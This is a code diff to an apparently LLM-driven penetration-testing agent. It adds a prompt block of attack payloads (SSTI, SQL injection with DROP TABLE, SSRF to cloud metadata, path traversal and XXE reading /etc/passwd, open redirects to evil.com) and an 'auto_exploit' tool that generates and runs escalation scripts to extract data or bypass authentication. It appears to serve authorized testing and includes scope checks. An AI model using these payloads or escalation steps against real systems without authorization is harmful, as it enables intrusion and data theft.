@@ -30,6 +30,7 @@ from agent.tools.sandbox import (
     execute_in_sandbox,
     validate_network_targets,
 )
+from agent.tools.scope_checker import scope_guard
 from agent.tools.script_templates import (
     ALLOWED_IMPORTS,
     build_generation_prompt,
@@ -37,6 +38,69 @@ from agent.tools.script_templates import (
 )
 
 logger = logging.getLogger(__name__)
+
+# ---------------------------------------------------------------------------
+# Output format preamble -- injected into every generation prompt so that the
+# orchestrator's finding extractor can parse results without heuristics.
+# ---------------------------------------------------------------------------
+
+_OUTPUT_FORMAT_PREAMBLE: str = """\
+=== REQUIRED OUTPUT FORMAT ===
+Every interesting finding MUST be printed using one of these severity prefixes:
+
+[CRITICAL] <title>: <detail>
+[HIGH]     <title>: <detail>
+[MEDIUM]   <title>: <detail>
+[LOW]      <title>: <detail>
+[INFO]     <title>: <detail>
+
+Examples:
+[CRITICAL] SQL Injection: Parameter 'id' reflects unsanitized in error output
+[HIGH] Directory Traversal: /api/files?path=../../../../etc/passwd returns 200
+[INFO] Technology: Apache/2.4.29 detected via Server header
+
+Non-finding status lines (e.g. "Testing parameter x...") may use plain print.
+Only findings that confirm a vulnerability or reveal actionable intelligence
+need a severity prefix.
+"""
+
+# ---------------------------------------------------------------------------
+# Attack category hints -- injected so the LLM knows what techniques to try
+# per parameter type, rather than only doing what the description says.
+# ---------------------------------------------------------------------------
+
+_ATTACK_CATEGORY_HINTS: str = """\
+=== ATTACK CATEGORIES TO TEST (where applicable) ===
+Apply these checks against every relevant parameter or endpoint you find:
+
+SSTI (Server-Side Template Injection):
+  Payloads: {{7*7}}, ${{7*7}}, <%= 7*7 %>, #{{7*7}}, {{config}}
+  Confirmation: if response contains "49" the expression was evaluated.
+
+SQLi (SQL Injection):
+  Payloads: ', ", 1' OR '1'='1, 1; DROP TABLE--, 1 AND SLEEP(5)--
+  Confirmation: SQL error strings, boolean response differences, or time delays.
+
+SSRF (Server-Side Request Forgery):
+  Payloads in URL/file/src params: http://169.254.169.254/latest/meta-data/,
+  http://localhost/, http://0.0.0.0/, http://[::1]/
+  Confirmation: cloud metadata content, internal service banners, or status 200.
+
+Path Traversal:
+  Payloads: ../../../etc/passwd, ....//....//etc/passwd, %2e%2e%2f%2e%2e%2f
+  Confirmation: /etc/passwd content (root: or daemon: lines) in response body.
+
+XXE (XML External Entity):
+  Apply when Content-Type is application/xml or text/xml.
+  Payload: <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  Confirmation: file contents appear in response.
+
+Open Redirect:
+  Payloads in redirect/next/url/return params: //evil.com, https://evil.com,
+  /\\evil.com
+  Confirmation: Location header points to injected host, or response body
+  contains the injected URL.
+"""
 
 # ---------------------------------------------------------------------------
 # Tool spec -- registered alongside all other Phantom tools
@@ -166,9 +230,7 @@ _BLOCKED_BUILTINS: frozenset[str] = frozenset(
 )
 
 # Top-level allowed module roots (derived from ALLOWED_IMPORTS)
-_ALLOWED_ROOTS: frozenset[str] = frozenset(
-    m.split(".")[0] for m in ALLOWED_IMPORTS
-)
+_ALLOWED_ROOTS: frozenset[str] = frozenset(m.split(".")[0] for m in ALLOWED_IMPORTS)
 
 
 # ---------------------------------------------------------------------------
@@ -427,9 +489,7 @@ class DynamicToolForge:
 
             if not validation.valid:
                 error_detail = "\n".join(f"  - {e}" for e in validation.errors)
-                return (
-                    f"BLOCKED: Generated script failed validation:\n{error_detail}"
-                )
+                return f"BLOCKED: Generated script failed validation:\n{error_detail}"
 
         if validation.warnings:
             for w in validation.warnings:
@@ -491,9 +551,9 @@ class DynamicToolForge:
                 retry_validation = _validate_script(retry_code, self.scope_targets)
                 if retry_validation.valid:
                     retry_wrapped = wrap_script(retry_code, self.scope_targets)
-                    retry_hash = hashlib.sha256(
-                        retry_code.encode("utf-8")
-                    ).hexdigest()[:16]
+                    retry_hash = hashlib.sha256(retry_code.encode("utf-8")).hexdigest()[
+                        :16
+                    ]
                     retry_name = f"forge_{retry_hash}_retry.py"
                     retry_path = os.path.join(self._scripts_dir, retry_name)
                     try:
@@ -536,7 +596,18 @@ class DynamicToolForge:
 
         Returns the raw code string or None on failure.
         """
-        prompt = build_generation_prompt(description, target, context)
+        # Prepend the standardised output-format contract and attack-category
+        # hints so every generated script produces finding lines that the
+        # orchestrator's extractor can parse without guessing at the format.
+        augmented_description = (
+            _OUTPUT_FORMAT_PREAMBLE
+            + "\n"
+            + _ATTACK_CATEGORY_HINTS
+            + "\n=== YOUR TASK ===\n"
+            + description
+        )
+
+        prompt = build_generation_prompt(augmented_description, target, context)
 
         try:
             raw_response = self.llm_call(prompt)
@@ -702,6 +773,46 @@ class DynamicToolForge:
 # The run() function below is a shim that defers to the singleton.
 _forge_instance: Optional[DynamicToolForge] = None
 
+# ---------------------------------------------------------------------------
+# auto_exploit -- targeted confirmation script for a single finding
+# ---------------------------------------------------------------------------
+
+AUTO_EXPLOIT_TOOL_SPEC: dict[str, Any] = {
+    "name": "auto_exploit",
+    "description": (
+        "Given a specific finding title and detail, automatically generates and executes "
+        "a targeted Python script to confirm exploitability and measure impact. "
+        "Use this immediately after a [HIGH] or [CRITICAL] finding to escalate the attack "
+        "with a focused proof-of-concept. Returns structured output with a severity assessment."
+    ),
+    "input_schema": {
+        "type": "object",
+        "properties": {
+            "finding_title": {
+                "type": "string",
+                "description": "The finding title exactly as reported (e.g. 'SQL Injection').",
+            },
+            "finding_detail": {
+                "type": "string",
+                "description": (
+                    "The finding detail line — endpoint, parameter, payload, and observed "
+                    "evidence that triggered the finding."
+                ),
+            },
+            "target": {
+                "type": "string",
+                "description": "Primary target (must be in scope).",
+            },
+            "timeout": {
+                "type": "integer",
+                "description": "Execution timeout in seconds (default 90, max 300).",
+                "default": 90,
+            },
+        },
+        "required": ["finding_title", "finding_detail", "target"],
+    },
+}
+
 
 def init_forge(
     llm_call: Callable,
@@ -749,3 +860,78 @@ def run(
         context=context,
         timeout=timeout,
     )
+
+
+def auto_exploit(
+    finding_title: str = "",
+    finding_detail: str = "",
+    target: str = "",
+    timeout: int = 90,
+    **kwargs: Any,
+) -> str:
+    """Auto-exploit tool registry entry point.
+
+    Takes a specific finding and generates + executes a targeted exploit script
+    via the forge to confirm exploitability and measure impact.
+
+    The forge must be initialized via ``init_forge()`` before this is called.
+    """
+    if _forge_instance is None:
+        return (
+            "ERROR: Dynamic Tool Forge is not initialized. "
+            "The orchestrator must call init_forge() before auto_exploit can be used."
+        )
+
+    if not finding_title or not finding_title.strip():
+        return "ERROR: finding_title is required."
+    if not finding_detail or not finding_detail.strip():
+        return "ERROR: finding_detail is required."
+    if not target or not target.strip():
+        return "ERROR: target is required."
+
+    target = target.strip()
+
+    # Scope check before any forge call.
+    guard = scope_guard(target)
+    if guard:
+        return guard
+
+    timeout = max(10, min(timeout, 300))
+
+    # Build a focused exploit-confirmation description.
+    exploit_description = (
+        f"EXPLOIT CONFIRMATION TASK\n\n"
+        f"Finding: {finding_title.strip()}\n"
+        f"Detail: {finding_detail.strip()}\n\n"
+        "Write a Python script that:\n"
+        "1. Reproduces the exact condition described in the finding detail above.\n"
+        "2. Attempts to escalate impact — e.g. extract data, bypass authentication,\n"
+        "   read sensitive files, or trigger the full exploit chain.\n"
+        "3. Measures and reports the blast radius (how many records/endpoints are affected).\n"
+        "4. Prints each result with the correct severity prefix:\n"
+        "   [CRITICAL] / [HIGH] / [MEDIUM] / [LOW] / [INFO]\n"
+        "5. Prints a final [SEVERITY ASSESSMENT] line summarizing confirmed impact.\n\n"
+        "Be precise: target the specific parameter/endpoint from the finding detail."
+    )
+
+    context = (
+        f"This is an escalation script. The initial finding was:\n"
+        f"  Title: {finding_title.strip()}\n"
+        f"  Detail: {finding_detail.strip()}\n"
+        "Focus exclusively on confirming and deepening exploitation of this specific issue."
+    )
+
+    raw_result = _forge_instance.forge_tool(
+        description=exploit_description,
+        target=target,
+        context=context,
+        timeout=timeout,
+    )
+
+    # Prepend a header that makes it easy for the orchestrator to correlate.
+    header = (
+        f"[auto_exploit] Escalation attempt for: {finding_title.strip()}\n"
+        f"Target: {target}\n"
+        f"{'-' * 60}\n"
+    )
+    return header + raw_result
